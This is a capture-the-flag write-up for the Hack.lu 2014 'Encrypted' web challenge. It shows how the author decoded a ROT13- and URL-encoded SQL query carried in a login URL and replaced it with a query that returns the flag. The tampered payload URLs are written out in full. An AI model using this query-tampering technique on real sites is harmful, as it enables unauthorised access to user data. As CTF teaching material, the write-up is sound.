<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="application/xhtml+xml; charset=UTF-8" />
<meta name="generator" content="AsciiDoc 8.6.9" />
<title>Hack.lu CTF 2014: Encrypted</title>
<link rel="stylesheet" href="http://markable.in/site_media/static/bootstrap/css/bootstrap.min.css">
</script>
<style>
body {
	margin:2em 2em 2em 2em
}
</style>
</script>

</head>
<body>

<h1>Write up of Encrypted Challenge Hack.lu 2014</h1>
<a href="https://wildwildweb.fluxfingers.net:1411">https://wildwildweb.fluxfingers.net:1411</a>
<p>By <strong>Abstract</strong> 23/10/14</p>

<h2 id="solution">Solution</h2>
<p>This was one of the easiest challenges in the 2014 hack.lu CTF, and it involved a simple web log in interface. Checking the page’s source code revealed nothing interesting so I entered a test username and password and was taken to a page telling me that the login had failed. Again, there was nothing interesting in the page’s source code. However, the URL of the log in failed page was:</p>
<pre>
<code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG+%60anzr%60+SEBZ+%60hfref%60+JURER+%60anzr%60+%3D+%27nnnn%27+NAQ+%60cnffjbeq%60+%3D+ZQ5%28%27oooo%27%29</code></pre>

<p>i.e. as a massive flashing red light in an hacking challenge. Removing the URL encoding (using <a href="http://meyerweb.com/eric/tools/dencoder/">http://meyerweb.com/eric/tools/dencoder/</a>) this became:</p>

<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG `anzr` SEBZ `hfref` JURER `anzr` = 'nnnn' NAQ `cnffjbeq` = ZQ5('oooo')</code></pre>

<p>As an additional test I entered <code>abcdef</code> as the username and <code>12345</code> as the password and got:</p>

<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG `anzr` SEBZ `hfref` JURER `anzr` = 'nopqrs' NAQ `cnffjbeq` = ZQ5('12345')</code></pre>

<p><code>abcdef</code> seems to have become <code>nopqrs</code> and <code>12345</code> became <code>12345</code>, so this is ROT13 encoding. ROT13 decoding (<a href="http://www.rot13.com">http://www.rot13.com</a>) the whole URL we get: </p>

<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?query=SELECT `name` FROM `users` WHERE `name` = 'abcdef' AND `password` = MD5('12345')</code></pre>

<p>I.e., SQL is being past to the login page as a query. We change this to a query that will always work:</p>

<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?query=SELECT `name` FROM `users`</code></pre>

<p>ROT13 encode it: </p>

<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG `anzr` SEBZ `hfref`</code></pre>

<p>URL encode it:</p>

<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG+%60anzr%60+SEBZ+%60hfref%60</code></pre>

<p>And going to this URL we get the flag:</p>
<pre><code>
Encrypted Login

Hello admin! The flag is flag{nobody_needs_server_side_validation}.


</code></pre>



